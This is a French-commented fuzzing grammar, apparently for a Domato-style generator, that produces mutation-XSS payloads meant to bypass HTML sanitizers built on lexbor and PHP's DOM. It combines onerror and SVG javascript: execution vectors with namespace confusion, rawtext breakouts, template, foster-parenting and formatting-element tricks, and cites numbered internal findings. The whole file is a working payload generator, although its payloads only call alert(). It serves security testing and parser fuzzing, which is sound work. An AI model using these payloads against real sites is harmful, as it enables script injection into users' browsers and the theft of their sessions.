
!max_recursion 200

## mxss.txt — Grammaire mXSS & Sanitizer Bypass
### Chaque génération tire dans les pools → combinaisons inédites à chaque fichier.

### POOLS — éléments interchangeables par classe sémantique

## VECTEURS D'EXÉCUTION

<xss_exec> = <lt>img src=x onerror=alert()<gt>
<xss_exec> = <lt>svg viewBox="0 0 160 40" xmlns="http://www.w3.org/2000/svg"<gt><lt>a href="https://developer.mozilla.org/"<gt><lt>set attributeName="href" to="javascript:alert('SVG XSS IN ELEM')" /<gt><lt>text x="10" y="25"<gt>click<lt>/text<gt><lt>/a<gt><lt>/svg<gt>

#### alert() classique avec img
<xss_exec_attr> = <lt>img src=x onerror=alert()<gt>

#### avec svg et set
<xss_exec_attr> = <lt>svg viewBox='0 0 160 40' xmlns='http://www.w3.org/2000/svg'<gt><lt>a href='https://developer.mozilla.org/'<gt><lt>set attributeName='href' to='javascript:alert('SVG XSS IN ATTR')' /<gt><lt>text x='10' y='25'<gt>click<lt>/text<gt><lt>/a<gt><lt>/svg<gt>

#### avec svg et animate
<xss_exec_attr> = <lt>svg viewBox='0 0 160 40' xmlns='http://www.w3.org/2000/svg'<gt><lt>a href='https://developer.mozilla.org/'<gt><lt>animate attributeName='href' to='javascript:alert('SVG XSS IN ATTR')' begin='0s' dur='1s' fill='freeze' /<gt><lt>text x='10' y='25'<gt>click<lt>/text<gt><lt>/a<gt><lt>/svg<gt>

## HEADING TITLE ELEMENTS : font buguer lexbor (php ou standalone)
### cf. P-MXSS-037

<heading_title_elem_open> = <lt>h1<gt>
<heading_title_elem_close> = <lt>/h1<gt>
<heading_title_elem_open> = <lt>h2<gt>
<heading_title_elem_close> = <lt>/h2<gt>
<heading_title_elem_open> = <lt>h3<gt>
<heading_title_elem_close> = <lt>/h3<gt>
<heading_title_elem_open> = <lt>h4<gt>
<heading_title_elem_close> = <lt>/h4<gt>
<heading_title_elem_open> = <lt>h5<gt>
<heading_title_elem_close> = <lt>/h5<gt>
<heading_title_elem_open> = <lt>h6<gt>
<heading_title_elem_close> = <lt>/h6<gt>


## FOREIGN CONTENT
### Réf.: https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inforeign

#### foreign_content : font pour pop rules

<foreign_font_elem> = <lt>font color="black"<gt>
<foreign_font_elem> = <lt>font face="black"<gt>
<foreign_font_elem> = <lt>font size=10<gt>

#### foreign_content : élément math ou svg

<foreign_content_elem_open> = <lt>math<gt>
<foreign_content_elem_close> = <lt>/math<gt>
<foreign_content_elem_open> = <lt>svg<gt>
<foreign_content_elem_close> = <lt>/svg<gt>

#### foreign_content_namespace_hip : MathML HTML integration points (contenu repassé au parseur HTML)

<foreign_content_namespace_hip> = <lt>mi<gt>
<foreign_content_namespace_hip> = <lt>mo<gt>
<foreign_content_namespace_hip> = <lt>mn<gt>
<foreign_content_namespace_hip> = <lt>ms<gt>
<foreign_content_namespace_hip> = <lt>mtext<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='text/html'<gt>
<foreign_content_namespace_hip> = <lt>annotation-xml encoding='application/xhtml+xml'<gt>

#### foreign_content_namespace_hip : SVG HTML integration points (contenu parsé en namespace xhtml)

<foreign_content_namespace_hip> = <lt>desc<gt>
<foreign_content_namespace_hip> = <lt>title<gt>
<foreign_content_namespace_hip> = <lt>foreignObject<gt>

### foreign_content_pop : Attributs qui font pop selon la spec mais non respectés par lexbor standalone et/ou DOM php

#### foreign_content_pop : Bug DOM de php uniquement
<foreign_content_pop> = <lt>/p<gt>
<foreign_content_pop> = <lt>/br<gt>

#### foreign_content_pop : Bug DOM + lexbor standalone
<foreign_content_pop> = <lt>sup<gt>

#### foreign_content_pop : Qui normalement font bien poper

<foreign_content_pop> = <lt>b<gt>
<foreign_content_pop> = <lt>big<gt>
<foreign_content_pop> = <lt>blockquote<gt>
<foreign_content_pop> = <lt>body<gt>
<foreign_content_pop> = <lt>br<gt>
<foreign_content_pop> = <lt>center<gt>
<foreign_content_pop> = <lt>code<gt>
<foreign_content_pop> = <lt>dd<gt>
<foreign_content_pop> = <lt>div<gt>
<foreign_content_pop> = <lt>dl<gt>
<foreign_content_pop> = <lt>dt<gt>
<foreign_content_pop> = <lt>em<gt>
<foreign_content_pop> = <lt>embed<gt>
<foreign_content_pop> = <lt>head<gt>
<foreign_content_pop> = <heading_title_elem_open>
<foreign_content_pop> = <lt>hr<gt>
<foreign_content_pop> = <lt>i<gt>
<foreign_content_pop> = <lt>img<gt>
<foreign_content_pop> = <lt>li<gt>
<foreign_content_pop> = <lt>listing<gt>
<foreign_content_pop> = <lt>menu<gt>
<foreign_content_pop> = <lt>meta<gt>
<foreign_content_pop> = <lt>nobr<gt>
<foreign_content_pop> = <lt>ol<gt>
<foreign_content_pop> = <lt>p<gt>
<foreign_content_pop> = <lt>pre<gt>
<foreign_content_pop> = <lt>ruby<gt>
<foreign_content_pop> = <lt>s<gt>
<foreign_content_pop> = <lt>small<gt>
<foreign_content_pop> = <lt>span<gt>
<foreign_content_pop> = <lt>strong<gt>
<foreign_content_pop> = <lt>strike<gt>
<foreign_content_pop> = <lt>table<gt>
<foreign_content_pop> = <lt>tt<gt>
<foreign_content_pop> = <lt>u<gt>
<foreign_content_pop> = <lt>ul<gt>
<foreign_content_pop> = <lt>var<gt>

<foreign_content_pop> = <foreign_font_elem>

## Foreign content namespace confusion
### Transitions de parseur HTML ↔ MathML ↔ SVG.

#### Basiques
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_pop><xss_exec>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_pop><mxss_template><xss_exec>

<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><xss_exec>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><mxss_template><xss_exec>


#### Inception
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_pop><mxss_payload><xss_exec>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><mxss_payload><xss_exec>


#### normalisation de <image>  — comportement différent selon namespace (P-MXSS-035)
<mxss_foreign_confusion> = <foreign_content_elem_open><lt>image src=x onerror=alert()<gt><foreign_content_elem_close>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_namespace_hip><lt>image src=x onerror=alert()<gt><foreign_content_elem_close>
<mxss_foreign_confusion> = <foreign_content_elem_open><foreign_content_pop><lt>image src=x onerror=alert()<gt><foreign_content_elem_close>
<mxss_foreign_confusion> = <mxss_foreign_confusion><lt>image src=x onerror=alert()<gt><foreign_content_elem_close>

## RAW TEXT / RCDATA — consomment jusqu'au closing tag correspondant
### Réf.: https://html.spec.whatwg.org/multipage/parsing.html#generic-raw-text-element-parsing-algorithm

#### Éléments RCDATA
#### ie (title|textarea)

<rcdata_rawtext_elem_open> = <lt>title<gt>
<rcdata_rawtext_elem_close> = <lt>/title<gt>
<rcdata_rawtext_elem_open> = <lt>textarea<gt>
<rcdata_rawtext_elem_close> = <lt>/textarea<gt>

#### Éléments RAW TEXT
#### ie (style|script|xmp|noscript|iframe|noembed|noframes)
<rcdata_rawtext_elem_open> = <lt>style<gt>
<rcdata_rawtext_elem_close> = <lt>/style<gt>

<rcdata_rawtext_elem_open> = <lt>script<gt>
<rcdata_rawtext_elem_close> = <lt>/script<gt>

<rcdata_rawtext_elem_open> = <lt>noscript<gt>
<rcdata_rawtext_elem_open> = <lt>xmp<gt>

<rcdata_rawtext_elem_close> = <lt>/xmp<gt>
<rcdata_rawtext_elem_close> = <lt>/noscript<gt>

<rcdata_rawtext_elem_open> = <lt>iframe<gt>
<rcdata_rawtext_elem_close> = <lt>/iframe<gt>

<rcdata_rawtext_elem_open> = <lt>noembed<gt>
<rcdata_rawtext_elem_close> = <lt>/noembed<gt>

<rcdata_rawtext_elem_open> = <lt>noframes<gt>
<rcdata_rawtext_elem_close> = <lt>/noframes<gt>

#### Pattern canonique (P-MXSS-032 a/b/c/d)
<mxss_rawtext_break> = <rcdata_rawtext_elem_open><lt>a title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>

#### inception
<mxss_rawtext_break> = <rcdata_rawtext_elem_open><lt>a title="<rcdata_rawtext_elem_close><mxss_payload><xss_exec_attr>"<gt>


## CLASSE 3 — Template content mode
### Contenu dans DocumentFragment — sanitiseurs DOM-live le manquent.


#### Template seul
<mxss_template> = <lt>template<gt><xss_exec><lt>/template<gt>
<mxss_template> = <lt>template<gt><mxss_payload><lt>/template<gt>
<mxss_template> = <lt>template<gt><mxss_foreign_confusion><lt>/template<gt>

## CLASSE 4 — Processing instruction / bogus comment
### `<\?>` → bogus comment HTML5 (§13.2.5.46).

#### PI + srcdoc (P-MXSS-001)
<pi> = <lt>?
<pi> = <gt>

<mxss_pi> = <pi><mxss_payload>
<mxss_pi> = <pi><mxss_payload><mxss_pi>

## CLASSE 5 — Rawtext en SVG via chaîne de namespaces
#### form+math+HIP+mglyph+svg → <rawtext> traité comme élément générique par lexbor.

<mxss_foreign_rawtext> = <lt>form<gt><mxss_foreign_confusion><lt>/form<gt><lt>form<gt><mxss_foreign_confusion><lt>path is='<mxss_rawtext_break>'<gt>

<mxss_foreign_rawtext> = <lt>form id='outer'<gt><mxss_foreign_confusion><lt>/form<gt><lt>form id='inner'<gt><mxss_foreign_confusion><lt>form id='outer'<gt><mxss_foreign_confusion><lt>/form<gt><lt>form id='inner'<gt><mxss_foreign_confusion>><lt>table<gt><lt>tr<gt><mxss_rawtext_break><lt>/table<gt>

## CLASSE X — Foster parenting & select context
### Éléments déplacés hors <table> par le parseur.
### Réf.: https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-intable

<in_table_elem> = <lt>table<gt>

#### Note: si template n'a pas de root node, il sera silencieusement ignoré.
<in_table_elem> = <lt>template<gt>

<in_table_special_elem_open> = <lt>tbody<gt>
<in_table_special_elem_close> = <lt>/tbody<gt>
<in_table_special_elem_open> = <lt>tfoot<gt>
<in_table_special_elem_close> = <lt>/tfoot<gt>
<in_table_special_elem_open> = <lt>thead<gt>
<in_table_special_elem_close> = <lt>/thead<gt>
<in_table_special_elem_open> = <lt>td<gt>
<in_table_special_elem_close> = <lt>/td<gt>
<in_table_special_elem_open> = <lt>th<gt>
<in_table_special_elem_close> = <lt>/th<gt>
<in_table_special_elem_open> = <lt>tr<gt>
<in_table_special_elem_close> = <lt>/tr<gt>
<in_table_special_elem_open> = <lt>ul<gt>
<in_table_special_elem_close> = <lt>/ul<gt>
<in_table_special_elem_open> = <lt>ol<gt>
<in_table_special_elem_close> = <lt>/ol<gt>
<in_table_special_elem_open> = <lt>li<gt>
<in_table_special_elem_close> = <lt>/li<gt>
<in_table_special_elem_open> = <lt>caption<gt>
<in_table_special_elem_close> = <lt>/caption<gt>
<in_table_special_elem_open> = <lt>colgroup<gt>
<in_table_special_elem_close> = <lt>/colgroup<gt>
<in_table_special_elem_open> = <lt>col<gt>
<in_table_special_elem_close> = <lt>/col<gt>

<in_table_textarea_payload> = <lt>textarea<gt>.<lt>/textarea<gt>
<in_table_textarea_payload> = <lt>textarea<gt><afe_elem>.<lt>/textarea<gt>

#### Généralisation de P-MXSS-038.
<mxss_foster> = <in_table_elem><afe_elem><in_table_special_elem_open><in_table_textarea_payload>

#### Inception du payload précédent
<mxss_foster> = <in_table_elem><mxss_payload><in_table_special_elem_open><in_table_textarea_payload>

#### Généralisation de P-MXSS-0XX (à documenter). Peut ne pas fonctionner si l'élément de clôture ne correspond pas à l'élément d'ouverture.
<mxss_foster> = <in_table_elem><in_table_special_elem_open><afe_elem><in_table_special_elem_close><in_table_textarea_payload>

#### Inception du payload précédent
<mxss_foster> = <in_table_elem><in_table_special_elem_open><mxss_payload><in_table_special_elem_close><in_table_textarea_payload>

#### Foster parenting complexe table × SVG × select × math (P-MXSS-021)
<mxss_foster> = <lt>table<gt><mxss_foreign_confusion><lt>table<gt><mxss_foreign_confusion><lt>select<gt><mxss_foreign_confusion><lt>select<gt><mxss_foreign_confusion><lt>table<gt>
<mxss_foster> = <lt>table<gt><mxss_payload><lt>table<gt><mxss_payload><lt>select<gt><mxss_payload><lt>select<gt><mxss_payload><lt>table<gt>

#### select context bug : xmp dans caption (P-MXSS-033)
<mxss_foster> = <lt>table<gt><lt>caption<gt><mxss_foreign_rawtext><lt>select<gt><xss_exec_attr><gt><lt>/p<gt>

#### AAA : <a> imbriqué via table (P-MXSS-031)
<mxss_foster> = <lt>a id=1<gt><lt>table<gt><lt>a id=2<gt>
<mxss_foster> = <lt>a id=1<gt><mxss_payload><lt>table<gt><lt>a id=2<gt>


## CLASSE X — Heading Element Bug
### Éléments dupliqué hors <hx> par le parseur dès lors qu'un élément mathml ou svg est accompagné d'un Html Integration Point correspondant à son namespace.

#### Liste des Active Formating Elements (AFE) https://html.spec.whatwg.org/multipage/parsing.html#formatting
<afe_elem> = <lt>a<gt>
<afe_elem> = <lt>a title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>b<gt>
<afe_elem> = <lt>b title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>big<gt>
<afe_elem> = <lt>big title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>code<gt>
<afe_elem> = <lt>code title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>em<gt>
<afe_elem> = <lt>em title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>font<gt>
<afe_elem> = <lt>font title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>i<gt>
<afe_elem> = <lt>i title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>nobr<gt>
<afe_elem> = <lt>nobr title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>s<gt>
<afe_elem> = <lt>s title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>small<gt>
<afe_elem> = <lt>small title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>strike<gt>
<afe_elem> = <lt>strike title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>strong<gt>
<afe_elem> = <lt>strong title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>tt<gt>
<afe_elem> = <lt>tt title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>
<afe_elem> = <lt>u<gt>
<afe_elem> = <lt>u title="<rcdata_rawtext_elem_close><xss_exec_attr>"<gt>

#### Liste des éléments dans un périmètre spécifique https://html.spec.whatwg.org/multipage/parsing.html#has-an-element-in-the-specific-scope

<element_in_scope> = <lt>applet<gt>
<element_in_scope> = <lt>applet<gt><mxss_payload>
<element_in_scope> = <lt>caption<gt>
<element_in_scope> = <lt>caption<gt><mxss_payload>
<element_in_scope> = <lt>html<gt>
<element_in_scope> = <lt>html<gt><mxss_payload>
<element_in_scope> = <lt>table<gt>
<element_in_scope> = <lt>table<gt><mxss_payload>
<element_in_scope> = <lt>td<gt>
<element_in_scope> = <lt>td<gt><mxss_payload>
<element_in_scope> = <lt>th<gt>
<element_in_scope> = <lt>th<gt><mxss_payload>
<element_in_scope> = <lt>marquee<gt>
<element_in_scope> = <lt>marquee<gt><mxss_payload>
<element_in_scope> = <lt>object<gt>
<element_in_scope> = <lt>object<gt><mxss_payload>
<element_in_scope> = <lt>select<gt>
<element_in_scope> = <lt>select<gt><mxss_payload>
<element_in_scope> = <lt>template<gt><lt>a<gt>test<lt>/a<gt><lt>/template<gt>
<element_in_scope> = <lt>template<gt><mxss_payload><lt>/template<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mi<gt>
<element_in_scope> = <lt>math<gt><lt>mi<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mo<gt>
<element_in_scope> = <lt>math<gt><lt>mo<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mn<gt>
<element_in_scope> = <lt>math<gt><lt>mn<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>ms<gt>
<element_in_scope> = <lt>math<gt><lt>ms<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>mtext<gt>
<element_in_scope> = <lt>math<gt><lt>mtext<gt><mxss_payload>
<element_in_scope> = <lt>math<gt><lt>annotation-xml encoding='text/html'<gt>
<element_in_scope> = <lt>math<gt><lt>annotation-xml encoding='text/html'<gt><mxss_payload>
<element_in_scope> = <lt>svg<gt><lt>foreignObject<gt>
<element_in_scope> = <lt>svg<gt><lt>foreignObject<gt><mxss_payload>
<element_in_scope> = <lt>svg<gt><lt>desc<gt>
<element_in_scope> = <lt>svg<gt><lt>desc<gt><mxss_payload>
<element_in_scope> = <lt>svg<gt><lt>title<gt>
<element_in_scope> = <lt>svg<gt><lt>title<gt><mxss_payload>

#### Généralisation du payload. Avec lexbor ne fonctionne que avec MATH/SVG + HIP correspondant au namespace de l'élément

<mxss_afe> = <heading_title_elem_open><afe_elem><element_in_scope><heading_title_elem_close><xss_exec>
<mxss_afe> = <heading_title_elem_open><afe_elem><element_in_scope><heading_title_elem_close><mxss_payload>
<mxss_afe> = <heading_title_elem_open><mxss_payload><element_in_scope><heading_title_elem_close>

## RACINE — tirage aléatoire parmi les classes de techniques

<mxss_payload nonrecursive=true p=0.1> = <lt>a<gt>SAFE FALLBACK AFTER TOO LONG RECURSION<lt>/a<gt>
<mxss_payload> = <mxss_afe>
<mxss_payload> = <mxss_foreign_rawtext>
<mxss_payload> = <mxss_rawtext_break>
<mxss_payload> = <mxss_foreign_confusion>
<mxss_payload> = <mxss_foster>
<mxss_payload> = <mxss_pi>

<HTMLmxssElement root=true> = <mxss_payload>
